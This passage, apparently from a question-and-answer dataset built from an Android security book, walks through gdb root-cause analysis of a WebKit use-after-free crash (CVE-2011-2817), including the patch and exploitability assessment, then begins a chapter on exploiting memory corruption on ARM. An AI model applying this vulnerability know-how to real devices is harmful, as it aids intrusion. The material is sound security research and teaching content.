5\n(fill)\nI/libc ( 2999): /system/bin/netd: using libc.debug.malloc 5 (fill)\nI/libc ( 3001): /system/bin/iptables: using libc.debug.malloc 5 (fill)\nI/libc ( 3002): /system/bin/ip6tables: using libc.debug.malloc 5 (fill)\nI/libc ( 3003): /system/bin/iptables: using libc.debug.malloc 5 (fill)\nI/libc ( 3004): /system/bin/ip6tables: using libc.debug.malloc 5 (fill)\nI/libc ( 3000): /system/bin/app_process: using libc.debug.malloc 5\n(fill)\n[...]\nUnfortunately, testing these debugging facilities on Android 4.3 in the presence\nof confi rmed bugs shows that they don’t work very well, if at all. Hopefully this\nsituation improves with future versions of Android. Regardless, this debugging\nfacility lays the building blocks for future work in creating more robust heap\ndebugging functionality.\nc07.indd 11:8:41:AM 02/25/2014 Page 249\n250 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nWatchpoints\nA watchpoint is a special kind of breakpoint that triggers when certain opera-\ntions are performed on a memory location. On x86 and x64 watchpoints are\nimplemented using hardware breakpoints and allow a researcher to be notifi ed\non read, write, or both. Unfortunately, most ARM processors do not implement\nhardware breakpoints. It is possible to accomplish the same thing on ARM using\nsoftware watchpoints. However, software watchpoints are very, very slow and\nexpensive in comparison due to their reliance on single-stepping. Still, they are\nuseful for tracking down when a particular variable changes value.\nSay a researcher knows some object’s member variable is changed after it\nis allocated. She doesn’t know where it is changed in the code—only that is\nchanged. First she puts a breakpoint after the object is allocated. When that\nbreakpoint is hit, she creates a watchpoint using GDB’s watch command. After\ncontinuing execution, she notices execution slows down considerably. When\nthe program changes the value, GDB suspends execution on the instruction\nfollowing the change. This technique successfully revealed the code location\nthat the researcher sought.\nInterdependent Breakpoints\nBreakpoints that create other breakpoints, or interdependent breakpoints, are\nvery powerful tools. The most important aspect of using this technique is that\nit eliminates noise. Consider a crash from heap corruption that happens on a\ncall to a function called main_event_loop. As its name suggests, this function is\nexecuted often. Determining the root cause requires fi guring out exactly what\nblock was being operated on when the corruption occurred. However, setting a\nbreakpoint on main_event_loop prematurely stops execution over and over. If\nthe researcher knows that the corruption happens from processing particular\ninput and knows where the code that starts processing that input is, he can place\na breakpoint there fi rst. When that breakpoint is hit, he can set a breakpoint on\nmain_event_loop. If he’s lucky, the fi rst time the new breakpoint is hit will be\nthe invocation when the crash occurs. Regardless, all previous invocations that\ndefi nitely couldn’t have caused the corruption are successfully ignored (and\nwith no performance penalty). In this example scenario, using interdependent\nbreakpoints helps narrow the window to the exact point of corruption. Another\nsimilar scenario is presented in the next section, “Analyzing a WebKit Crash.”\nAnalyzing a WebKit Crash\nDetermining the root cause of a vulnerability is an iterative process. Tracking\ndown an issue often requires executing the crashing test case numerous times.\nThough a debugger is instrumental in this process, the root cause is rarely\nc07.indd 11:8:41:AM 02/25/2014 Page 250\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 251\nrevealed immediately. Working backward through data fl ow and control fl ow,\nincluding inter-procedural fl ow, is what ultimately brings us to the heart of\nthe issue.\nFor demonstrative purposes, we study an HTML fi le that crashes the Android\nBrowser that ships with a Galaxy Nexus running Android 4.3. Interestingly,\nneither the stable nor beta versions of Chrome for Android are affected. Using\nseveral techniques in conjunction with the debugging methods outlined earlier in\nthis chapter, we work to discover the root cause of the bug that causes this crash.\nIt sometimes helps to crash the browser repeatedly and look at the tombstones\nthat result. The values in registers are telling. The following includes output\nfrom several crashes that occurred from loading this page:\nroot@maguro:/data/tombstones # /data/local/tmp/busybox head -9 * | grep\n'pc'\nip 00000001 sp 5e8003c8 lr 5d46fee5 pc 5a50ec48 cpsr 200e0010\nip 00000001 sp 5ddba3c8 lr 5c865ee5 pc 5e5fc2b8 cpsr 20000010\nip 00000001 sp 5dedc3c8 lr 5ca4bee5 pc 00000000 cpsr 200f0010\nip 00000001 sp 5dedc3c8 lr 5ca4bee5 pc 60538ad0 cpsr 200e0010\nip 00000001 sp 5e9003b0 lr 5d46fee5 pc 5a90bf80 cpsr 200e0010\nip 00000001 sp 5e900688 lr 5d46fee5 pc 5a518d20 cpsr 200f0010\nip 00000001 sp 5eb00688 lr 5d46fee5 pc 5a7100a0 cpsr 200f0010\nip 00000001 sp 5ea003c8 lr 5d46fee5 pc 5edfa268 cpsr 200f0010\nIn this particular case, you can see that the crash location varies signifi cantly\nfrom one execution to the next. In fact, the PC register (akin to EIP on x86) ends\nup with many different strange values. This is highly indicative of a use-after-\nfree vulnerability. To know for sure though, and to determine why such an issue\nwould be occurring, you have to dig deeper.\nTo gain more insight into what’s happening, you employ the native code\ndebugging environment that you set up earlier in this chapter. As before, run\nthe debugging.sh shell script in the background on the host machine. This runs\nthe attach.sh shell script on the device, which asks the browser to navigate to\nthe about:blank page, waits a bit, and attaches the GDB server. Then, on the\nhost machine, we launch the GDB client with our GDB script that connects to\nthe waiting GDB server:\ndev:gn-browser-dbg $ arm-eabi-gdb -q -x script.gdb app_process\ndev:~/android/source $ ./debugging.sh &\n[1] 28994\ndev:gn-browser-dbg $ arm-eabi-gdb -q -x script.gdb app_process\nReading symbols from /android/source/gn-browser-dbg/app_process...done.\nwarning: Could not load shared library symbols for 86 libraries, e.g. libm.\nso.\nUse the \"info sharedlibrary\" command to see the complete listing.\nDo you need \"set solib-search-path\" or \"set sysroot\"?\nwarning: Breakpoint address adjusted from 0x40079b79 to 0x40079b78.\nepoll_wait () at bionic/libc/arch-arm/syscalls/epoll_wait.S:10\n10 mov r7, ip\n(gdb) cont\nContinuing.\nc07.indd 11:8:41:AM 02/25/2014 Page 251\n252 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nAfter attaching the debugger and continuing execution, we’re ready to open\nthe HTML fi le that causes the crash. Like you did in the attach.sh script, you\nuse am start to ask the browser to navigate to the page.\nshell@maguro:/ $ am start -a android.intent.action.VIEW -d \\\nhttp://evil-site.com/crash1.html com.google.android.browser\nIn this particular instance, it may require several attempts to load the page for\na crash to occur. When the crash fi nally happens, you’re ready to start digging in.\nProgram received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 17879]\n0x00000000 in ?? ()\n(gdb)\nOh boy! The browser crashed with the PC register set to zero! This is a clear\nindication that something has gone horribly wrong. There are many different\nways this can happen, so you want to fi nd out how you might have gotten to\nthis state.\nThe first place you look for clues is in the call stack. Output from the\nbacktrace GDB command is shown here:\n(gdb) back\n#0 0x00000000 in ?? ()\n#1 0x5d46fee4 in WebCore::Node::parentNode (this=0x5a621088) at\nexternal/webkit/Source/WebCore/dom/Node.h:731\n#2 0x5d6748e0 in WebCore::ReplacementFragment::removeNode (this=<optimized\nout>, node=...)\nat external/webkit/Source/WebCore/editing/ReplaceSelectionCommand.\ncpp:215\n#3 0x5d675d5a in WebCore::ReplacementFragment::removeUnrenderedNodes\n(this=0x5ea004a8, holder=0x5a6b6a48)\nat external/webkit/Source/WebCore/editing/ReplaceSelectionCommand.\ncpp:297\n#4 0x5d675eac in WebCore::ReplacementFragment::ReplacementFragment\n(this=0x5ea004a8, document=<optimized out>,\nfragment=<optimized out>, matchStyle=<optimized out>, selection=...)\nat external/webkit/Source/WebCore/editing/ReplaceSelectionCommand.\ncpp:178\n#5 0x5d6764c2 in WebCore::ReplaceSelectionCommand::doApply\n(this=0x5a621800)\nat external/webkit/Source/WebCore/editing/ReplaceSelectionCommand.\ncpp:819\n#6 0x5d66701c in WebCore::EditCommand::apply (this=0x5a621800) at\nexternal/webkit/Source/WebCore/editing/EditCommand.cpp:92\n#7 0x5d66e2e2 in WebCore::executeInsertFragment (frame=<optimized out>,\nfragment=<optimized out>)\nat external/webkit/Source/WebCore/editing/EditorCommand.cpp:194\n#8 0x5d66e328 in WebCore::executeInsertHTML (frame=0x5aa65690, value=...)\nat external/webkit/Source/WebCore/editing/EditorCommand.cpp:492\n#9 0x5d66d3d4 in WebCore::Editor::Command::execute (this=0x5ea0068c,\nparameter=..., triggeringEvent=0x0)\nat external/webkit/Source/WebCore/editing/EditorCommand.cpp:1644\nc07.indd 11:8:41:AM 02/25/2014 Page 252\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 253\n#10 0x5d6491a4 in WebCore::Document::execCommand (this=0x5aa1ac80,\ncommandName=..., userInterface=<optimized out>, value=...)\nat external/webkit/Source/WebCore/dom/Document.cpp:4053\n#11 0x5d5c7df6 in WebCore::DocumentInternal::execCommandCallback\n(args=<optimized out>)\nat .../libwebcore_intermediates/Source/WebCore/bindings/V8Document.\ncpp:1473\n#12 0x5d78dc22 in HandleApiCallHelper<false> (isolate=0x4173c468, args=...)\nat\nexternal/v8/src/builtins.cc:1120\n[...]\nFrom the call stack, you can see that the stack itself is intact and there are\nseveral functions leading up to the crash. On ARM, you can see how the pro-\ngram got here by looking where the LR register points. Dump the instructions\nat this location, subtracting either two or four depending on whether the code\nis Thumb or ARM. If the value is odd, the address points to Thumb code.\n(gdb) x/i $lr - 2\n0x5d46fee3 <WebCore::Node::parentNode() const+18>: blx r2\nThe instruction you see is a branch to a location stored in the R2 register.\nChecking the content of this register confi rms if that is indeed how the program\ngot here.\n(gdb) i r r2\nr2 0x0 0\nIt looks fairly certain that this is how the program got here.\nYou still haven’t found the root cause, though, so start tracking data fl ow\nbackward to see how in the world R2 became zero. It defi nitely isn’t normal to\nbranch to zero. To fi nd out more, look closer at the parent (calling) function by\ndisassembling it.\n(gdb) up\n#1 0x5d46fee4 in WebCore::Node::parentNode (this=0x594134b0) at\nexternal/webkit/Source/WebCore/dom/Node.h:731\n731 return getFlag(IsShadowRootFlag) || isSVGShadowRoot() ? 0 :\nparent();\n(gdb) disas\nDump of assembler code for function WebCore::Node::parentNode() const:\n0x5d46fed0 <+0>: push {r4, lr}\n0x5d46fed2 <+2>: mov r4, r0\n0x5d46fed4 <+4>: ldr r3, [r0, #36] ; 0x24\n0x5d46fed6 <+6>: lsls r1, r3, #13\n0x5d46fed8 <+8>: bpl.n 0x5d46fede <WebCore::Node::parentNode()\nconst+14>\n0x5d46feda <+10>: movs r0, #0\n0x5d46fedc <+12>: pop {r4, pc}\n0x5d46fede <+14>: ldr r1, [r0, #0]\n0x5d46fee0 <+16>: ldr r2, [r1, #112] ; 0x70\n0x5d46fee2 <+18>: blx r2\n=> 0x5d46fee4 <+20>: cmp r0, #0\nc07.indd 11:8:41:AM 02/25/2014 Page 253\n254 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\n0x5d46fee6 <+22>: bne.n 0x5d46feda <WebCore::Node::parentNode()\nconst+10>\n0x5d46fee8 <+24>: ldr r0, [r4, #12]\n0x5d46feea <+26>: pop {r4, pc}\nEnd of assembler dump.\nThe disassembly listing shows a short function that indeed contains the branch\nto R2. It doesn’t appear to take any parameters, so it must be operating entirely\non its members. Working backward, you can see that R2 is loaded from offset\n112 of the block of memory pointed to by R1. In turn, R1 is loaded from offset\nzero within the block pointed to by R0. Confi rm that these values are indeed\nwhat led to the zero R2 value.\n(gdb) i r r1\nr1 0x5a621fa0 1516380064\n(gdb) x/wx $r1 + 112\n0x5a622010: 0x00000000\n(gdb) x/wx $r0\n0x5a621088: 0x5a621fa0\nConfi rmed! It looks fairly certain that something went wrong with the chunk\nat 0x5a621fa0 or the chunk at 0x5a621088. Check to see if these are free or in\nuse by dumping the heap header of the chunk at 0x5a621088.\n(gdb) x/2wx $r0 - 0x8\n0x5a621080: 0x00000000 0x00000031\nSpecifi cally, look at the second 32-bit value. This corresponds to the size of the\ncurrent chunk, which uses the lower 3 bits as fl ags. The status indicated by the\nlack of bit 2 being set means this chunk is free! This is defi nitely a use-after-free\nvulnerability of some type.\nNext, you want to get some idea where this chunk is freed. Quit the debugger,\nwhich allows the process to crash as usual. The debugging.sh shell script waits\na bit, starts the browser back up, and attaches the GDB server.\nNOTE Dialogs may periodically appear asking if you want to wait for the browser to\nrespond. This is normal due to the debugger slowing the browser down. Click the Wait\nbutton to keep things going (or just ignore the dialog).\nWhen the browser is up again, attach the GDB client again. This time, set a\ntracing breakpoint on the parent function to try to interact shortly before the\ncrash happens:\n(gdb) break 'WebCore::Node::parentNode() const'\nBreakpoint 1 at 0x5d46fed2: file external/webkit/Source/WebCore/dom/Node.h,\nline 730.\n(gdb) commands\nType commands for breakpoint(s) 1, one per line.\nEnd with a line saying just \"end\".\n>cont\nc07.indd 11:8:41:AM 02/25/2014 Page 254\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 255\n>end\n(gdb) cont\nContinuing.\nUnfortunately, you will quickly notice that this breakpoint is hit very fre-\nquently inside the browser. This is because the parentNode function is called\nfrom many places throughout the WebKit code base. To avoid this issue, we put\na breakpoint on the grandparent function instead.\n(gdb) break \\\n'WebCore::ReplacementFragment::removeNode(WTF::PassRefPtr<WebCore::Node>)'\nBreakpoint 1 at 0x5d6748d4: file\nexternal/webkit/Source/WebCore/editing/ReplaceSelectionCommand.cpp, line\n211.\n(gdb) cont\nContinuing.\nAfter the breakpoint is set, load the crash triggering page again.\n[Switching to Thread 18733]\nBreakpoint 1, WebCore::ReplacementFragment::removeNode (this=0x5ea004a8,\nnode=...)\nat external/webkit/Source/WebCore/editing/ReplaceSelectionCommand.\ncpp:211\n211 {\n(gdb)\nNow that you’ve stopped before the crash, create a tracing breakpoint that\nshows where the free function is being called from. To reduce noise, limit this\nbreakpoint to only the current thread. Before you can do that, you need to know\nwhat thread number corresponds to this thread.\n(gdb) info threads\n...\n* 2 Thread 18733 WebCore::ReplacementFragment::removeNode\n(this=0x5e9004a8, node=...)\nat external/webkit/Source/WebCore/editing/ReplaceSelectionCommand.\ncpp:211\n...\nNow that you know this is thread 2, create a breakpoint limited to this thread\nand set up some script commands to execute when it is hit.\n(gdb) break dlfree thread 2\nBreakpoint 2 at 0x401259e2: file\nbionic/libc/bionic/../upstream-dlmalloc/malloc.c, line 4711.\n(gdb) commands\nType commands for breakpoint(s) 2, one per line.\nEnd with a line saying just \"end\".\n>silent\n>printf \"free(0x%x)\\n\", $r0\n>back\n>printf \"\\n\"\n>cont\n>end\n(gdb) cont\nContinuing.\nc07.indd 11:8:41:AM 02/25/2014 Page 255\n256 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nYou will immediately start seeing output from this breakpoint upon continu-\ning. Don’t worry too much about the output until the browser crashes again.\nNOTE It should only be necessary to tell the debugger to continue from our break-\npoint once before the crash appears. If the debugger stops more than that, it is prob-\nably best to kill the browser and try again. Scripting the whole process by adding to\nour script.gdb fi le makes restarting to try again less painful.\nWhen the browser crashes again, look at the value in R0:\n(gdb) i r r0\nr0 0x5a6a96d8 1516934872\nThen, scan backward through the debugger output looking for the free call\nthat released that memory.\nfree(0x5a6a96d8)\n#0 dlfree (mem=0x5a6a96d8) at\nbionic/libc/bionic/../upstream-dlmalloc/malloc.c:4711\n#1 0x401229c0 in free (mem=<optimized out>) at\nbionic/libc/bionic/malloc_debug_common.cpp:230\n#2 0x5d479b92 in WebCore::Text::~Text (this=0x5a6a96d8, __in_\nchrg=<optimized\nout>) at external/webkit/Source/WebCore/dom/Text.h:30\n#3 0x5d644210 in WebCore::removeAllChildrenInContainer<WebCore::Node,\nWebCore::ContainerNode> (container=<optimized out>)\nat external/webkit/Source/WebCore/dom/ContainerNodeAlgorithms.h:64\n#4 0x5d644234 in removeAllChildren (this=0x5a8d36f0) at\nexternal/webkit/Source/WebCore/dom/ContainerNode.cpp:76\n#5 WebCore::ContainerNode::~ContainerNode (this=0x5a8d36f0,\n__in_chrg=<optimized out>)\nat external/webkit/Source/WebCore/dom/ContainerNode.cpp:100\n#6 0x5d651890 in WebCore::Element::~Element (this=0x5a8d36f0,\n__in_chrg=<optimized out>)\nat external/webkit/Source/WebCore/dom/Element.cpp:118\n#7 0x5d65c5b4 in WebCore::StyledElement::~StyledElement (this=0x5a8d36f0,\n__in_chrg=<optimized out>)\nat external/webkit/Source/WebCore/dom/StyledElement.cpp:121\n#8 0x5d486830 in WebCore::HTMLElement::~HTMLElement (this=0x5a8d36f0,\n__in_chrg=<optimized out>)\nat external/webkit/Source/WebCore/html/HTMLElement.h:34\n#9 0x5d486848 in WebCore::HTMLElement::~HTMLElement (this=0x5a8d36f0,\n__in_chrg=<optimized out>)\nat external/webkit/Source/WebCore/html/HTMLElement.h:34\n#10 0x5d46fb9a in WebCore::TreeShared<WebCore::ContainerNode>::removedLast\nRef\n(this=<optimized out>)\nat external/webkit/Source/WebCore/platform/TreeShared.h:118\n#11 0x5d46aef0 in deref (this=<optimized out>) at\nexternal/webkit/Source/WebCore/platform/TreeShared.h:79\n#12 WebCore::TreeShared<WebCore::ContainerNode>::deref (this=<optimized\nout>)\nat external/webkit/Source/WebCore/platform/TreeShared.h:68\nc07.indd 11:8:41:AM 02/25/2014 Page 256\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 257\n#13 0x5d46f69a in ~RefPtr (this=0x5e9003e8, __in_chrg=<optimized out>) at\nexternal/webkit/Source/JavaScriptCore/wtf/RefPtr.h:58\n#14 WebCore::Position::~Position (this=0x5e9003e8, __in_chrg=<optimized\nout>)\nat external/webkit/Source/WebCore/dom/Position.h:52\n#15 0x5d675d60 in WebCore::ReplacementFragment::removeUnrenderedNodes\n(this=0x5e9004a8, holder=0x5a6c5fe0)\n...\nThere it is! You can see that it is getting freed by a call to a destructor for a\nWebCore::Text object. The other thing you can tell from looking closely at the\npreceding stack trace is that a buffer is being freed when removing all children\nfrom a certain type of HTML element called a ContainerNode. This happens\nduring the fi rst call to removeNode, where your initial breakpoint was placed.\nInspecting the node parameter on the second call to removeNode, you can see\nthis pointer being passed in. That defi nitely should not happen.\nAt this point you have confi rmed that this is a use-after-free vulnerability.\nStill, you have not yet determined the root cause. To do this you have to ven-\nture further up the call stack and suspiciously analyze what the program is\ndoing incorrectly. Turn your attention to the function that calls removeNode,\nremoveUnrenderedNodes. The source for this function is presented here:\n287 void ReplacementFragment::removeUnrenderedNodes(Node* holder)\n288 {\n289 Vector<Node*> unrendered;\n290\n291 for (Node* node = holder->firstChild(); node;\nnode = node->traverseNextNode(holder))\n292 if (!isNodeRendered(node) && !isTableStructureNode(node))\n293 unrendered.append(node);\n294\n295 size_t n = unrendered.size();\n296 for (size_t i = 0; i < n; ++i)\n297 removeNode(unrendered[i]);\n298 }\nWithin this function, the loop on line 291 uses traverseNextNode to go through\nthe children of the Node object that’s passed in. For each Node, the code inside\nthe loop adds any non-table Node that is not rendered to the unrendered Vector.\nThen, the loop on line 296 processes all of the accumulated Node objects.\nIt’s likely that the fi rst call to removeNode is fi ne. However, the second call\noperates on a freed pointer. In addition to knowing where the free happens\nand what uses the freed block, we know from our stack trace on dlfree that\nremoveNode will remove all children of a ContainerNode passed to it. Still, we\ndon’t know the root cause. We don’t know exactly what leads to the use-after-\nfree. It seems unlikely that something strange would be happening inside the\nisNodeRendered and isTableStructureNode functions. The only other function\nc07.indd 11:8:41:AM 02/25/2014 Page 257\n258 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nbeing called is the traverseNextNode function. Looking at the source code for\nthis function we see the following:\n1116 Node* Node::traverseNextNode(const Node* stayWithin) const\n1117 {\n1118 if (firstChild())\n1119 return firstChild();\n1120 if (this == stayWithin)\n1121 return 0;\n1122 if (nextSibling())\n1123 return nextSibling();\n1124 const Node *n = this;\n1125 while (n && !n->nextSibling() && (!stayWithin ||\nn->parentNode() != stayWithin))\n1126 n = n->parentNode();\n1127 if (n)\n1128 return n->nextSibling();\n1129 return 0;\n1130 }\nLines 1118 and 1119 are the most telling. This function will descend into\nchildren whenever they exist. Because of this behavior, the unrendered Vector\nwinds up containing any non-rendered nodes and their children. As such, the\nunrendered Vector will hold an already deleted child of the fi rst node when\nthe fi rst call returns.\nYou can verify this relationship by inspecting the unrendered Vector state\non the fi rst call to removeNode:\nBreakpoint 1, WebCore::ReplacementFragment::removeNode (this=0x5ea004a8,\nnode=...)\nat external/webkit/Source/WebCore/editing/ReplaceSelectionCommand.\ncpp:211\n211 {\n(gdb) up\n#1 0x5d675d5a in WebCore::ReplacementFragment::removeUnrenderedNodes\n(this=0x5ea004a8, holder=0x5ab3e550)\nat external/webkit/Source/WebCore/editing/ReplaceSelectionCommand.\ncpp:297\n297 removeNode(unrendered[i]);\n(gdb) p/x n\n$1 = 0x2\n(gdb) x/2wx unrendered.m_buffer.m_buffer\n0x6038d8b8: 0x5edbf620 0x595078c0\nYou can see that there are two entries and they point to Node objects at\n0x5edbf620 and 0x595078c0. Look at the contents of these Node objects closer\nto see how they are related. Specifi cally, see if the fi rst Node is the parent of the\nsecond node.\n(gdb) p/x *(Node *)0x5edbf620\n$2 = {\n[...]\nm_parent = 0x5ab3e550\n[...]\n}\nc07.indd 11:8:41:AM 02/25/2014 Page 258\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 259\n(gdb) p/x *(Node *)0x595078c0\n$3 = {\n[...]\nm_parent = 0x5edbf620\n[...]\n}\n(gdb)\nAha! It is! You could stop here, but being sure requires following these two\nobjects through to the crash to make sure no funny business is unfolding.\nYou can see that the second entry in the Vector has an m_parent fi eld that\npoints to the fi rst Node. When the second Node is removed, it and its parent are\nalready freed. Place a breakpoint on dlfree again. This time, let GDB display\nits usual breakpoint notifi cation and have it continue automatically.\n(gdb) break dlfree thread 2\nBreakpoint 2 at 0x401259e2: file\nbionic/libc/bionic/../upstream-dlmalloc/malloc.c,\nline 4711.\n(gdb) commands\nType commands for breakpoint(s) 2, one per line.\nEnd with a line saying just \"end\".\n>cont\n>end\n(gdb) cont\nContinuing.\n[...]\nBreakpoint 2, dlfree (mem=0x595078c0) at\nbionic/libc/bionic/../upstream-dlmalloc/malloc.c:4711\n[...]\nBreakpoint 2, dlfree (mem=0x5edbf620) at\nbionic/libc/bionic/../upstream-dlmalloc/malloc.c:4711\n[...]\nYou can see, again, that these two pointers are freed. The fi rst call frees\nthe child Node and the second frees the fi rst Node. The original breakpoint on\nremoveNode is hit next.\nBreakpoint 1, WebCore::ReplacementFragment::removeNode (this=0x5ea004a8,\nnode=...)\nat external/webkit/Source/WebCore/editing/ReplaceSelectionCommand.\ncpp:211\n211 {\n(gdb) p/x node\n$4 = {\nm_ptr = 0x595078c0\n}\nFinally, you’ve confi rmed that the Node passed in to removeNode is indeed the\nfreed child Node. If you continue, you’re already executing undefi ned behavior\nby operating on this released object.\nSo the root cause is that both the removeNode and removeUnrenderedNodes\nfunctions are traversing into the children of a Node that is to be removed. But\nhow do you fi x the issue?\nc07.indd 11:8:41:AM 02/25/2014 Page 259\n260 Chapter 7 ■ Debugging and Analyzing Vulnerabilities\nThere are several ways to avoid this vulnerability. In fact, this vulnerability\nwas already patched by the WebKit developers and assigned CVE-2011-2817.\nThe fact that Android remains vulnerable is an unfortunate oversight and is\nlikely due to differences in security prioritization within Google. The fi x that\nthe WebKit developers offi cially carried forward is as follows:\ndiff --git a/Source/WebCore/editing/ReplaceSelectionCommand.cpp\nb/Source/WebCore/editing/ReplaceSelectionCommand.cpp\nindex d4b0897..8670dfb 100644\n--- a/Source/WebCore/editing/ReplaceSelectionCommand.cpp\n+++ b/Source/WebCore/editing/ReplaceSelectionCommand.cpp\n@@ -292,7 +292,7 @@\nvoid ReplacementFragment::removeUnrenderedNodes(Node* holder)\n{\n- Vector<Node*> unrendered;\n+ Vector<RefPtr<Node> > unrendered;\nfor (Node* node = holder->firstChild(); node;\nnode = node->traverseNextNode(holder))\nif (!isNodeRendered(node) && !isTableStructureNode(node))\nThis modifi cation changes the declaration of the unrendered Vector to hold\nreference counted pointers instead of raw pointers. Although this does remove\nthe possibility for use-after-free, there is another, more effi cient approach. The\ntraverseNextSibling function implements the same behavior as traverseNext-\nNode with one key difference. It does not traverse into child nodes. Because\nyou know that child nodes will get removed on the call to removeNode, this fi ts\nthe use case of this function better. The unrendered Vector would not contain\nchildren of nodes that get removed, and so the use-after-free is still avoided.\nJudging Exploitability\nAfter the root cause of an issue is isolated, the next goal is to further classify\nthe issue by judging how easily it can be exploited. Whether the ultimate goal\nis fi xing an issue or exploiting it, prioritizing based on ease of exploitation uses\nresources more effi ciently. Easy-to-exploit issues should be investigated with\nhigher priority than those that are hard to exploit.\nAccurately determining whether or not a bug can be exploited is a diffi cult,\ncomplicated, and lengthy process. Depending on the bug and the level of certainty\nrequired, this task can take anywhere from a few minutes to several months.\nThankfully, teams that are tasked with fi xing bugs may not need to concern\nthemselves with this task at all. They can simply fi x the bug. If the ultimate goal\nis prioritizing which bugs to fi x fi rst, one can err on the side of caution. However,\nresearchers aiming to prove a bug’s exploitability do not have this luxury.\nThe whole process is highly subjective and hinges on the experience and\nknowledge of the analyst or analysts involved. To make a correct determination,\nc07.indd 11:8:41:AM 02/25/2014 Page 260\nChapter 7 ■ Debugging and Analyzing Vulnerabilities 261\nanalysts must be well versed in state-of-the-art exploitation techniques. They\nmust be intimately familiar with all the exploit mitigations present on the tar-\nget platform. Even an experienced and knowledgeable analyst faces challenges\nwhen judging whether or not some bugs are exploitable.\nProving whether an issue is exploitable or not is easy sometimes, but other\ntimes it is simply infeasible. For example, the issue analyzed in the previous\nsection sometimes leads to a crash with a tainted PC register. This may, at a\nglance, be deemed highly dangerous. However, there seems to be very little\nchance to control the buffer that is freed before it is reused. This suggests that\nit may not actually be exploitable at all. Exploiting issues like this is covered in\nmore detail in Chapter 8.\nSummary\nIn this chapter you learned about debugging and analyzing vulnerabilities on\nAndroid. The chapter covers a plethora of techniques for debugging both Dalvik\nand native code, including using common debug facilities, leveraging automation\nto increase effi ciency, debugging at source level using AOSP-supported devices,\nand debugging on-device for increased performance. We explained why symbols\nare more important on ARM, showed how that leads to challenges in debug-\nging with non-AOSP devices, and offered ways to deal with these problems.\nFinally the chapter discussed two key goals when analyzing vulnerabilities:\ndetermining root cause and judging exploitability. You were introduced to\nseveral common vulnerability analysis tools and techniques to help you get a\ndeeper understanding of bugs that you might encounter. You walked through\nanalyzing the root cause of a vulnerability in the Android Browser and learned\nsome of the considerations involved in determining whether or not issues are\nexploitable.\nThe next chapter takes a closer look at user-space exploitation on Android.\nIt covers crucial code constructs and exploitation-relevant operating system\ndetails, and examines how several exploits work in detail.\nc07.indd 11:8:41:AM 02/25/2014 Page 261"
  },
  {
    "input": "What is the key concept discussed in this chapter regarding memory corruption vulnerabilities in user-space software on Android, and how do attackers exploit them?",
    "summary": "This chapter explores memory corruption vulnerabilities in Android user-space software, focusing on stack and heap exploitation techniques. It explains how attackers can manipulate memory regions to control program execution, using examples like stack buffer overflows and use-after-free issues. A case study details an advanced heap exploitation in the WebKit browser, demonstrating how an attacker can redirect control flow by overwriting virtual function table pointers. The chapter also covers mitigation strategies and historical exploits, such as GingerBreak and zergRush, which highlight the challenges and methods of exploiting vulnerabilities in Android systems.",
    "output": "CHAPTER\n8\nExploiting User Space Software\nThis chapter introduces exploiting memory corruption issues in user-space\nsoftware on the Android operating system. Well-known vulnerability classes,\nsuch as stack-based buffer overfl ows, are examined in the context of the ARM\narchitecture. The chapter discusses key implementation details that are relevant\nwhen developing exploits. Next, it examines a few historic exploits so you can\nunderstand the application of the previously introduced concepts. Finally, the\nchapter wraps up with a case study in advanced heap exploitation using a\nremotely exploitable vulnerability in the WebKit browser engine.\nMemory Corruption Basics\nThe key to understanding exploits for memory corruption vulnerabilities is\nabstraction. It is important to avoid thinking in terms of a high-level language\nsuch as C. Instead, an attacker should simply consider the memory of the target\nmachine as a fi nite amount of memory cells that are only assigned a meaning by\nthe target program’s semantics. This includes any meaning implicitly induced\nby certain instruction types or functions, such as those that treat regions of\nmemory as the stack or heap.\n263\nc08.indd 11:10:3:AM 02/25/2014 Page 263\n264 Chapter 8 ■ Exploiting User Space Software\nThe following sections discuss certain specifi c incarnations of memory\ncorruption and how they can be exploited on the Android platform. However,\nthey all have one thing in common with any other exploitation method: The\nimplicit assumptions the target code makes about certain memory regions are\nviolated by the attacker. Subsequently, these violations are used to manipulate\nthe target program’s state to the attacker’s liking. This can happen in more\nstraightforward ways, such as directing the native execution fl ow to attacker-\ncontrolled memory. It can also happen in more arcane ways, such as leveraging\nexisting program semantics on violated assumptions to make a program behave\nto the attacker’s choosing (often referred to as weird machine programming).\nThere are many details and advanced exploitation methods for both the\nuser-space stack and heap that cannot be covered in this chapter, because which\ntechnique to use depends so much on the vulnerability at hand. There are count-\nless resources on the Internet that provide further details that are sometimes\narchitecture specifi c. This chapter focuses on introducing the most common\nconcepts that affect the Android platform on ARM devices.\nStack Buff er Overfl ows\nLike many other architectures’ Application Binary Interfaces (ABIs), the ARM\nEmbedded ABI (EABI) makes heavy use of the designated (thread-specifi c)\nprogram stack. The following ABI rules are used on ARM:\n■ Functions that exceed four parameters get further parameters passed on\nthe stack using the push instruction.\n■ Local variables that cannot be stored in registers are allocated on the\ncurrent stack frame. This holds especially true for variables larger than\nthe 32-bit native word size of the ARM architecture and variables that\nare referenced by pointers.\n■ The return address from the current execution function is stored on the\nstack for non-leaf functions. More details on handling of function return\naddresses are discussed in Chapter 9.\nWhen a function that uses the stack is invoked, it typically starts with pro-\nlogue code that sets up a stack frame and ends with epilogue code that tears it\ndown again. The prologue code saves registers that should not be trashed onto\nthe stack. When returning from the function later, the corresponding epilogue\nrestores them. The prologue also allocates the space required for all local vari-\nables stored on the stack by adjusting the stack pointer accordingly. Because\nthe stack grows from high virtual memory to low memory, the stack pointer is\ndecremented in the prologue and incremented in the epilogue. Nested function\ncalls result in layered stack frames as shown in Figure 8-1.\nc08.indd 11:10:3:AM 02/25/2014 Page 264\nChapter 8 ■ Exploiting User Space Software 265\nsp low\nlocal variables n\nfp saved frame pointer n\nsaved program counter n\nstart of stack high\nc08.indd 11:10:3:AM 02/25/2014 Page 265\n.....\nlocal variables 1\nsaved frame pointer 1\nsaved program counter 1\nFigure 8-1: Multiple stack frames example\nNote that although there are special instructions in Thumb mode that deal\nwith the stack pointer register (namely push and pop); the general concept of\nthe stack is just an ABI agreement 